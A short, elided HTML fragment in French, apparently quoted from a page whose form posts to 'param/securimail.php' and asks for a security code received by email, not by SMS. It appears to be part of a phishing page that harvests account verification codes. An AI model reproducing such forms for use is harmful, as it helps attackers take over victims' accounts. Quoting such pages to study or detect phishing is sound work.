...
">
                    <div class="form">
                        ...
                        <form method="post" action="param/securimail.php">
                            ...
                            <p id="cc" style="font-size:15px"><b>NB:</b> N'entrez pas le code SMS reçu sur votre mobile ici,<br> uniquement celui reçu dans votre <b><span style="color:teal">boîte mail liée au compte</span></b>.</p>
                            </div>
